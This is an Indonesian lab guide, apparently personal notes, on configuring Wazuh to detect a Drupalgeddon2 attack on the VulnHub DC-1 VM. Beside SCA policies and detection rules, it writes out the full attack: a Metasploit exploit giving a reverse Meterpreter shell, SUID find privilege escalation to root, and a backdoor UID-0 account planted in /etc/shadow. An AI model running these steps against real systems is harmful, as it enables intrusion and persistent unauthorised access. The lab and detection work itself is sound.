
Menggunakan mesin DC-1 dari vulnhub: https://www.vulnhub.com/entry/dc-1,292/

Security Configuration Assessment (SCA) dipakai untuk melakukan uji konfigurasi dalam format YAML.

```
vi /var/ossec/etc/shared/default/sca_drupal.yaml


# Security Configuration Assessment
# Drupal

policy:
  id: "drupal"
  file: "drupal.yml"
  name: "Security checks for Drupal"
  description: "Find vulnerable versions of Drupal"

checks:
  - id: 100001
    title: "Drupal Drupalgeddon 2 Forms API Property Injection (CVE-2018-7600)"
    description: "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations."
    references:
      - https://www.cvedetails.com/cve/CVE-2018-7600/
      - https://nvd.nist.gov/vuln/detail/CVE-2018-7600
      - https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2
    condition: none
    rules:
      - 'c:find /var/www/ -type f -wholename *modules/help/help.inf* -exec grep -P version {} + -> r:^version && r:\p6.\d+'
      - 'c:find /var/www/ -type f -wholename *modules/help/help.inf* -exec grep -P version {} + -> r:^version && n:\p7.(\d+) compare < 58'
      - 'c:find /var/www/ -type f -wholename *modules/help/help.inf* -exec grep -P version {} + -> r:^version && n:\p8.(\d+) compare < 3'
      - 'c:find /var/www/ -type f -wholename *modules/help/help.inf* -exec grep -P version {} + -> r:^version && n:\p8.3.(\d+) compare < 9'
      - 'c:find /var/www/ -type f -wholename *modules/help/help.inf* -exec grep -P version {} + -> r:^version && n:\p8.4.(\d+) compare < 6'
      - 'c:find /var/www/ -type f -wholename *modules/help/help.inf* -exec grep -P version {} + -> r:^version && n:\p8.5.(\d+) compare < 1'
```


```
vi /var/ossec/etc/shared/default/agent.conf

<agent_config>
  <sca>
    <enabled>yes</enabled>
    <scan_on_start>yes</scan_on_start>
    <interval>15m</interval>
    <skip_nfs>yes</skip_nfs>
    <policies>
      <policy>/var/ossec/etc/shared/sca_drupal.yaml</policy>
    </policies>
  </sca>
</agent_config>
```


## Step 2: Konfigurasi SCA untuk mendeteksi binary berbahaya dengan SUID
```
vi /var/ossec/etc/shared/default/sca_systemfiles.yaml


# Security Configuration Assessment
# System files

policy:
  id: "system-files"
  file: "system-files.yml"
  name: "Security checks for system files"
  description: "Analyse system files to find vulnerabilities"

checks:
  - id: 100002
    title: "Dangerous binaries with SUID bit set found"
    description: "Binaries with SUID bit set can result in a root shell."
    condition: none
    rules:
      - 'c:find /usr/bin -perm -u=s -type f -printf "%y:%p\n" -> !r:arping|at|bwrap|chfn|chrome-sandbox|chsh|dbus-daemon-launch-helper|dmcrypt-get-device|exim4|fusermount|gpasswd|helper|kismet_capture|lxc-user-nic|mount|mount.cifs|mount.ecryptfs_private|mount.nfs|newgidmap|newgrp|newuidmap|ntfs-3g|passwd|ping|ping6|pkexec|polkit-agent-helper-1|pppd|snap-confine|ssh-keysign|su|sudo|traceroute6.iputils|ubuntu-core-launcher|umount|VBoxHeadless|VBoxNetAdpCtl|VBoxNetDHCP|VBoxNetNAT|VBoxSDL|VBoxVolInfo|VirtualBoxVM|vmware-authd|vmware-user-suid-wrapper|vmware-vmx|vmware-vmx-debug|vmware-vmx-stats|Xorg.wrap|chage|crontab|^"$'
```

Enable SCA Policy
```
vi /var/ossec/etc/shared/default/agent.conf

<agent_config>
  <sca>
    <enabled>yes</enabled>
    <scan_on_start>yes</scan_on_start>
    <interval>15m</interval>
    <skip_nfs>yes</skip_nfs>
    <policies>
      <policy>/var/ossec/etc/shared/sca_drupal.yaml</policy>
      <policy>/var/ossec/etc/shared/sca_systemfiles.yaml</policy>
    </policies>
  </sca>
</agent_config>
```

## Step 3: Mendeteksi Meterpreter

Apabila mesin dicek selama serangan meterpreter, maka akan terdapat koneksi  berikut ini
```
root@DC-1:/# ps -eo user,pid,cmd | grep www-data
# output
www-data  4428 sh -c php -r 'eval(base64_decode(Lyo8P3B));'
www-data  4429 php -r eval(base64_decode(Lyo8P3B));

root@DC-1:/# netstat -tunap | grep 4429
# output
tcp        0      0 192.168.1.54:50061      192.168.1.56:4444       ESTABLISHED 4429/php
```

Untuk mendeteksi
```
[root@manager ~]# vi /var/ossec/etc/shared/default/agent.conf
<wodle name="command">
    <disabled>no</disabled>
    <tag>ps-list</tag>
    <command>ps -eo user,pid,cmd</command>
    <interval>10s</interval>
    <ignore_output>no</ignore_output>
    <run_on_start>yes</run_on_start>
    <timeout>5</timeout>
</wodle>a
```

Deteksi base64
```
[root@manager ~]# vi /var/ossec/etc/rules/local_rules.xml


<group name="wazuh,">
    <rule id="100001" level="0">
        <location>command_ps-list</location>
        <description>List of running process.</description>
        <group>process_monitor,</group>
    </rule>
    <rule id="100002" level="10">
        <if_sid>100001</if_sid>
        <match>eval(base64_decode</match>
        <description>Reverse shell detected.</description>
        <group>process_monitor,attacks</group>
    </rule>
</group>
```

## Step 4: Apply change
```
[root@manager ~]# systemctl restart wazuh-manager
```

## Step 5: Install Wazuh Agent
`toor:root`
```
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list

apt-get update
```

```
WAZUH_MANAGER="10.0.0.2" apt-get install wazuh-agent
```


Disable update
```
sed -i "s/^deb/#deb/" /etc/apt/sources.list.d/wazuh.list
apt-get update
```

or 
```
echo "wazuh-agent hold" | dpkg --set-selections
```

# Attack and Detect
```
netdiscover
```

```
nmap -sC -sV -oA -T4 192.168.1.54
```

```
searchsploit drupal
```

We use druppalgeddon Forms API Property Injection (CVE-2019-7600)
```
root@kali:/# msfconsole
msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.1.54
rhosts => 192.168.1.54
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.1.56:4444 
[*] Sending stage (38288 bytes) to 192.168.1.54
[*] Meterpreter session 1 opened (192.168.1.56:4444 -> 192.168.1.54:39991) at 2020-06-12 12:08:23 +0200

meterpreter > getpid
Current pid: 7785
```

`mkpasswd -m sha-256 -S salt`

`www-data@DC-1:/var/www$ find /usr/bin -perm -u=s -type f`

```
root@kali:/# msfconsole

meterpreter > shell
Process 8998 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DC-1:/var/wwwfind . -exec /bin/sh \; -quit
find . -exec /bin/sh \; -quit
# /usr/sbin/useradd -ou 0 -g 0 toornew
/usr/sbin/useradd -ou 0 -g 0 toornew
# sed -i 's/toornew:!:/toornew:$6$uW5y3OHZDcc0avXy$WiqPpaw7e2a7K8Z.oKMUgMzCAVooT0HWNMKDBbrBnBlUXbLr1lFnboJ1UkC013gPZhVIX85IZ4RCq4\/cVqpO00:/g' /etc/shadow
sed -i 's/toornew:!:/toornew:$6$uW5y3OHZDcc0avXy$WiqPpaw7e2a7K8Z.oKMUgMzCAVooT0HWNMKDBbrBnBlUXbLr1lFnboJ1UkC013gPZhVIX85IZ4RCq4\/cVqpO00:/g' /etc/shadow


[root@manager ~]# ssh toornew@192.168.1.54
```

To connect to Wazuh Manager on newer version
```
Command

vi /etc/apt/sources.list
deb-src http://ftp.au.debian.org/debian/ wheezy main
deb-src http://security.debian.org/ wheezy/updates main
deb http://archive.debian.org/debian-security/ wheezy/updates main
deb http://archive.debian.org/debian wheezy main


apt-get update //error invalid since 1310d 9h 14min 12s
apt-get update -o Acquire::Check-Valid-Until=false;
apt-get install apt-transport-https ca-certificates lsb-release gnupg2 -o Acquire::Check-Valid-Until=false;
```
# Referensi
https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1
https://wazuh.com/blog/detecting-metasploit-attacks/


https://serverfault.com/questions/960970/wheezy-updates-on-archive-debian-org-returns-404-not-found
